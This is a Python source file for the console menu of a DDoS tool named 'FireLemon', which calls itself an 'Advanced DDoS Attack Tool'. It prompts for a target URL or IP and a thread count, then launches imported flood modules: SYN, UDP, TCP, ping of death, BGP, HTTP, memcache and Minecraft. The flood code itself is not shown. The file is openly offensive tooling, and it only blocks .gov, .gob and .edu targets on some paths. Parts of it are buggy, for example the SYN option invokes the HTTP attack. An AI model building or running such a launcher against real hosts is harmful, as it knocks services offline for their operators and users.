from scripts.layer_3.LemonSqueezy import LemonSqueezy
from scripts.layer_3.ping_of_death import PingOfDeath
from scripts.layer_4.syn_flood import SynFlood
from scripts.layer_4.tcp_flood import TCP
from scripts.layer_4.udp_flood import UDP
# from scripts.layer_4.Smurf import Smurf
# from scripts.layer_4.smnp_flood import SmnpFlood
from scripts.layer_4.minecraft import Minecraft
from scripts.layer_7.http_flood import HttpAttack
from scripts.layer_7.memcache import MemCache
# from scripts.layer_7.cookie_stuffing import CookieStuffing
# from scripts.layer_7.teardrop import Teardrop
import shutil
from rgbprint import gradient_print, Color, gradient_scroll, gradient_change
from main import FireLemon
from debug import Debug
from colorama import *
import platform
import os

columns = shutil.get_terminal_size().columns

NOTE = Fore.BLUE + "[NOTE] " + Fore.WHITE
INFO = Fore.MAGENTA + "[INFO] " + Fore.WHITE
WARN = Fore.YELLOW + "[WARN] " + Fore.WHITE
ERROR = Fore.RED + "[ERROR] " + Fore.WHITE

banner = """

   ▄████████  ▄█     ▄████████    ▄████████  ▄█          ▄████████   ▄▄▄▄███▄▄▄▄    ▄██████▄  ███▄▄▄▄       
  ███    ███ ███    ███    ███   ███    ███ ███         ███    ███ ▄██▀▀▀███▀▀▀██▄ ███    ███ ███▀▀▀██▄     
  ███    █▀  ███▌   ███    ███   ███    █▀  ███         ███    █▀  ███   ███   ███ ███    ███ ███   ███     
 ▄███▄▄▄     ███▌  ▄███▄▄▄▄██▀  ▄███▄▄▄     ███        ▄███▄▄▄     ███   ███   ███ ███    ███ ███   ███     
▀▀███▀▀▀     ███▌ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███       ▀▀███▀▀▀     ███   ███   ███ ███    ███ ███   ███     
  ███        ███  ▀███████████   ███    █▄  ███         ███    █▄  ███   ███   ███ ███    ███ ███   ███     
  ███        ███    ███    ███   ███    ███ ███▌    ▄   ███    ███ ███   ███   ███ ███    ███ ███   ███     
  ███        █▀     ███    ███   ██████████ █████▄▄██   ██████████  ▀█   ███   █▀   ▀██████▀   ▀█   █▀      
                    ███    ███              ▀                                                               

"""

Title = f"""
            ╔══════════════════════════════════════════════════════════════════════════════╗
                                                {FireLemon.__name__}
                                        Advanced DDoS Attack Tool
                                        Copyright 2024 Pastlecry
                                                  {FireLemon.__verrsion__}
            ╚══════════════════════════════════════════════════════════════════════════════╝
"""

options = """
            ╔══════════════════════════════════════════════════════════════════════════════╗
            1. attacks                          4. debug(Unavailable)                  
            2. options                          5. exit       
            3. attack                
            ╚══════════════════════════════════════════════════════════════════════════════╝
"""

attacks = """
            ╔══════════════════════════════════════════════════════════════════════════════╗
            Layer 3:
                1. IP flood(Unavailable) 
                2. Lemonsqueezy / BGP      :: sending BGP packets
                3. Ping of death           :: sending ICMP packets to server

            Layer 4:
                1. Syn flood               :: sending syn packets
                2. UDP flood               :: sending packets via UDP protocol
                3. TCP flood               :: sending packets via TCP protocol        
                4. Smurf(Unavailable)      :: sending ARP packets includeing src ip and dst ip to server
                5. SMNP(Unavailable)       :: sending SMNP packets to server port
                6. minecraft               :: DDoS minecraft server

            Layer 5:
                1. Slowloris(Unavailable)

            Layer 7:
                1. HTTP request flood      :: sending HTTP request to server
                2. DNS flood(Unavailable)  :: sending packets to DNS server
                3. Teardrop(Unavailable)                   
                4. Reflection(Unavailable) 
                5. Cookie stuffing(Unav..) :: sending cookies to server   
                6. Memcache                :: exploiting server's memcache
                7. VPN flood(Unavailable)  :: sending HTTP requests to vpn server
            ╚══════════════════════════════════════════════════════════════════════════════╝
"""

liney = "══════════════════════════════════════════════════════"

NOTE = Debug.NOTE()
WARN = Debug.WARN()
ERROR = Debug.ERROR()

def Print(title):
    gradient_print(
        title,
        start_color=Color.yellow,  
        end_color=Color.orange, 
    )

def Print_scroll(title):
    gradient_scroll(
        title, 
        start_color=Color.yellow,  
        end_color=Color.orange, 
    )

def Print_input(title):
    gradient_print(
        title, 
        start_color=Color.yellow,  
        end_color=Color.orange, 
    )
    result = input("\r")
    return result

def Print_line():
   gradient_print(
        liney, 
        start_color=Color.yellow,  
        end_color=Color.orange, 
    ) 

# Print banner
def Banner():
    gradient_print(
        banner.center(columns), 
        start_color=Color.yellow,    
        end_color=Color.orange, 
    )

# Print console
def TITLE():
    gradient_print(
        Title.center(columns), 
        start_color=Color.yellow,  
        end_color=Color.orange,
    )

# Console 
def Console():
    while True:

        option = Print_input("Select an option: ")

        if option == "options":
            Print(options)

        elif option == "attacks":
            Print(attacks)

        elif option == "debug":
            debug_s = Print_input("Enable debug mode: Y/n")
            if debug_s == "Y" or debug_s == "y" or debug_s == "yes":
                Print_scroll("Debug mode enabled!")
                continue
            elif debug_s == "N" or debug_s == "n" or debug_s == "no":
                Print_scroll("Debug mode disabled!")
                continue
            else:
                Print_scroll("not defined debug mode!")

        elif option == "ATTACK" or option == "attack" or option == "5":

            attack_layer = Print_input("Select an attack Layer(3/4/7): ")

            if attack_layer == "3" or attack_layer == "layer 3" or attack_layer == "LAYER 3":

                attack_mode = Print_input(f"Select an Layer {attack_layer} attack option: ")

                if attack_mode == "ICMP" or attack_mode == "icmp" or attack_mode == "ping of death":

                    Print_line()
                    print(NOTE)
                    Print_scroll("SYN flood attack method selected")

                    url_ = Print_input("Enter the URL: ")
                    if url_.startswith("http://") or url_.startswith("https://"):
                        if ".gov" in url_ or ".gob" in url_ or ".edu" in url_:
                            print(ERROR)
                            Print_scroll("cannot use .gov or .gob or .edu in the URL!")
                            exit()
                        else:
                            url = url_     
                    else:
                        print(ERROR)
                        Print_scroll("not defined url!")
                        Print_input("press any key to exit...")
                        exit()
                    threads = 50
                    threads_ = Print_input("Enter the number of threads(Default: 50): ")
                    if threads_ == "":
                        threads = 50
                    elif int(threads_) > 50 or int(threads_) < 50:
                        threads = threads_
                    else:
                        threads = 50
                    sleep_ = Print_input("Sleep time(Default: 0): ")
                    if sleep_ == "":
                        sleep = None
                    else:
                        sleep = int(sleep_)

                    Print_scroll("URL: \r")
                    print(Fore.WHITE + url)
                    Print_scroll("Threads: \r")
                    print(Fore.WHITE + str(threads))
                    Print_scroll("Sleep time: \r")
                    print(Fore.WHITE + str(sleep))
                    Print_line()
                    Print_input("\nPress Enter when you're ready!")
                    PingOfDeath(url, sleep, int(threads)).attack()
                    print("done!")
                    exit()

                elif attack_mode == "BGP" or attack_mode == "bgp" or attack_mode == "Lemonsqueezy":

                    Print_line()
                    print(NOTE)
                    Print_scroll("LemonSqueezy attack method selected")

                    url_ = Print_input("Enter the URL: ")
                    if url_.startswith("http://") or url_.startswith("https://"):
                        if ".gov" in url_ or ".gob" in url_ or ".edu" in url_:
                            print(ERROR)
                            Print_scroll("cannot use .gov or .gob or .edu in the URL!")
                            exit()
                        else:
                            url = url_     
                    else:
                        print(ERROR)
                        Print_scroll("not defined url!")
                        Print_input("press any key to exit...")
                        exit()
                    threads = 50
                    threads_ = Print_input("Enter the number of threads(Default: 50): ")
                    if threads_ == "":
                        threads = 50
                    elif int(threads_) > 50 or int(threads_) < 50:
                        threads = threads_
                    else:
                        threads = 50
                    sleep_ = Print_input("Sleep time(Default: 0): ")
                    if sleep_ == "":
                        sleep = None
                    else:
                        sleep = int(sleep_)

                    Print_scroll("URL: \r")
                    print(Fore.WHITE + url)
                    Print_scroll("Threads: \r")
                    print(Fore.WHITE + str(threads))
                    Print_scroll("Sleep time: \r")
                    print(Fore.WHITE + str(sleep))
                    Print_line()
                    Print_input("\nPress Enter when you're ready!")
                    LemonSqueezy(url, sleep, int(threads)).attack()
                    print("done!")
                    exit()

            elif attack_layer == "4" or attack_layer == "layer 4" or attack_layer == "LAYER 4":

                attack_mode = Print_input(f"Select an Layer {attack_layer} attack option: ")
                
                # TCP Flood Attack

                if attack_mode == "SYN" or attack_mode == "syn" or attack_mode == "1":

                    Print_line()
                    print(NOTE)
                    Print_scroll("SYN flood attack method selected")

                    url_ = Print_input("Enter the URL: ")
                    if url_.startswith("http://") or url_.startswith("https://"):
                        if ".gov" in url_ or ".gob" in url_ or ".edu" in url_:
                            print(ERROR)
                            Print_scroll("cannot use .gov or .gob or .edu in the URL!")
                            exit()
                        else:
                            url = url_     
                    else:
                        print(ERROR)
                        Print_scroll("not defined url!")
                        Print_input("press any key to exit...")
                        exit()
                    threads = 50
                    threads_ = Print_input("Enter the number of threads(Default: 50): ")
                    if threads_ == "":
                        threads = 50
                    elif int(threads_) > 50 or int(threads_) < 50:
                        threads = threads_
                    else:
                        threads = 50
                    sleep_ = Print_input("Sleep time(Default: 0): ")
                    if sleep_ == "":
                        sleep = None
                    else:
                        sleep = int(sleep_)

                    Print_scroll("URL: \r")
                    print(Fore.WHITE + url)
                    Print_scroll("Threads: \r")
                    print(Fore.WHITE + str(threads))
                    Print_scroll("Sleep time: \r")
                    print(Fore.WHITE + str(sleep))
                    Print_line()
                    Print_input("\nPress Enter when you're ready!")
                    HttpAttack(url, sleep, int(threads)).attack()
                    print("done!")
                    exit()

                # UDP Flood Attack
                    
                elif attack_mode == "UDP" or attack_mode == "udp" or attack_mode == "2":

                    Print_line()
                    print(NOTE)
                    Print_scroll("UDP flood attack method selected")

                    ip = Print_input("Enter the IP: ")
                    port = int(input("Enter the port: "))
                    threads = 50
                    threads_ = Print_input("Enter the number of threads(Default: 50): ")
                    if threads_ == "":
                        threads = 50
                    elif int(threads_) > 50 or int(threads_) < 50:
                        threads = threads_
                    else:
                        threads = 50
                    sleep_ = Print_input("Sleep time(Default: 0): ")
                    if sleep_ == "":
                        sleep = None
                    else:
                        sleep = int(sleep_)

                    Print_scroll("IP: \r")
                    print(Fore.WHITE + ip)
                    Print_scroll("Port: \r")
                    print(Fore.WHITE + port)
                    Print_scroll("Threads: \r")
                    print(Fore.WHITE + str(threads))
                    Print_scroll("Sleep time: \r")
                    print(Fore.WHITE + str(sleep))
                    Print_line()
                    Print_input("\nPress Enter when you're ready!")
                    UDP(ip, int(port), sleep, threads).attack()
                    print("done!")
                    exit()

                # TCP Flood Attack

                elif attack_mode == "TCP" or attack_mode == "tcp" or attack_mode == "3":

                    Print_line()
                    print(NOTE)
                    Print_scroll("TCP flood attack method selected")

                    ip = Print_input("Enter the IP: ")
                    port = int(input("Enter the port: "))
                    threads = 50
                    threads_ = Print_input("Enter the number of threads(Default: 50): ")
                    if threads_ == "":
                        threads = 50
                    elif int(threads_) > 50 or int(threads_) < 50:
                        threads = threads_
                    else:
                        threads = 50
                    sleep_ = Print_input("Sleep time(Default: 0): ")
                    if sleep_ == "":
                        sleep = None
                    else:
                        sleep = int(sleep_)

                    Print_scroll("IP: \r")
                    print(Fore.WHITE + ip)
                    Print_scroll("Port: \r")
                    print(Fore.WHITE + port)
                    Print_scroll("Threads: \r")
                    print(Fore.WHITE + str(threads))
                    Print_scroll("Sleep time: \r")
                    print(Fore.WHITE + str(sleep))
                    Print_line()
                    Print_input("\nPress Enter when you're ready!")
                    TCP(ip, int(port), sleep, threads).attack()
                    print("done!")
                    exit()

                # DNS flood Attack

                elif attack_mode == "minecraft" or attack_mode == "MINECRAFT" or attack_mode == "6":
                    Print_line()
                    print(NOTE)
                    Print_scroll("TCP flood attack method selected")

                    ip = Print_input("Enter the IP: ")
                    threads = 50
                    threads_ = Print_input("Enter the number of threads(Default: 50): ")
                    if threads_ == "":
                        threads = 50
                    elif int(threads_) > 50 or int(threads_) < 50:
                        threads = threads_
                    else:
                        threads = 50
                    sleep_ = Print_input("Sleep time(Default: 0): ")
                    if sleep_ == "":
                        sleep = None
                    else:
                        sleep = int(sleep_)

                    Print_scroll("IP: \r")
                    print(Fore.WHITE + ip)
                    Print_scroll("Port: \r")
                    print(Fore.WHITE + port)
                    Print_scroll("Threads: \r")
                    print(Fore.WHITE + str(threads))
                    Print_scroll("Sleep time: \r")
                    print(Fore.WHITE + str(sleep))
                    Print_line()
                    Print_input("\nPress Enter when you're ready!")
                    Minecraft(ip, sleep, threads)
                    print("done!")
                    exit()

            elif attack_layer == "7" or attack_layer == "layer 7" or attack_layer == "LAYER 7":

                attack_mode = Print_input(f"Select an Layer {attack_layer} attack option: ")

                if attack_mode == "HTTP" or attack_mode == "http" or attack_mode == "http flood" or attack_mode == "HTTP FLOOD" or attack_mode == "5":

                    Print_line()
                    print(NOTE)
                    Print_scroll("HTTP flood attack method selected")

                    print(NOTE)
                    Print("\rHTTP attack mode Selected")
                    url_ = Print_input("Enter the URL: ")
                    if url_.startswith("http://") or url_.startswith("https://"):
                        url = url_     
                    else:
                        print(ERROR + "not defined url!")
                        input("press any key to exit...")
                        exit()
                    threads = 50
                    threads_ = Print_input("Enter the number of threads(Default: 50): ")
                    if threads_ == "":
                        threads = 50
                    elif int(threads_) > 50 or int(threads_) < 50:
                        threads = threads_
                    else:
                        threads = 50
                    sleep_ = Print_input("Sleep time(Default: 0): ")
                    if sleep_ == "":
                        sleep = None
                    else:
                        sleep = int(sleep_)

                    Print_scroll("URL: \r")
                    print(Fore.WHITE + url)
                    Print_scroll("Threads: \r")
                    print(Fore.WHITE + str(threads))
                    Print_scroll("Sleep time: \r")
                    print(Fore.WHITE + str(sleep))
                    Print_line()
                    print(WARN + "\n")
                    input(Fore.MAGENTA + "Press Enter when you're ready!")
                    HttpAttack(url, int(threads), sleep).attack()
                    print("done!")
                    exit()

                elif attack_mode == "memcache" or attack_mode == "MEMCACHE" or attack_mode == "6":

                    Print_line()
                    print(NOTE)
                    Print_scroll("HTTP flood attack method selected")

                    print(NOTE)
                    Print("\rHTTP attack mode Selected")
                    url_ = Print_input("Enter the URL: ")
                    if url_.startswith("http://") or url_.startswith("https://"):
                        url = url_     
                    else:
                        print(ERROR + "not defined url!")
                        input("press any key to exit...")
                        exit()
                    threads = 50
                    threads_ = Print_input("Enter the number of threads(Default: 50): ")
                    if threads_ == "":
                        threads = 50
                    elif int(threads_) > 50 or int(threads_) < 50:
                        threads = threads_
                    else:
                        threads = 50
                    sleep_ = Print_input("Sleep time(Default: 0): ")
                    if sleep_ == "":
                        sleep = None
                    else:
                        sleep = int(sleep_)

                    Print_scroll("URL: \r")
                    print(Fore.WHITE + url)
                    Print_scroll("Threads: \r")
                    print(Fore.WHITE + str(threads))
                    Print_scroll("Sleep time: \r")
                    print(Fore.WHITE + str(sleep))
                    Print_line()
                    print(WARN + "\n")
                    input(Fore.MAGENTA + "Press Enter when you're ready!")
                    MemCache(url, int(threads), sleep).attack()
                    print("done!")
                    exit()

            else:

                print(ERROR + "not defined attack layer!")
                input("press any key to exit...")
                exit()

            # HTTP Request Flood Attack

        elif option == "exit":
            Print_scroll("Thanks for using " + FireLemon.__name__ + ":3")
            exit()

if platform.system().lower() == "windows":
    os.system("cls")

elif platform.system().lower() == "linux":
    os.system("clear")

else:
    os.system("clear")

Banner()
TITLE()
Console()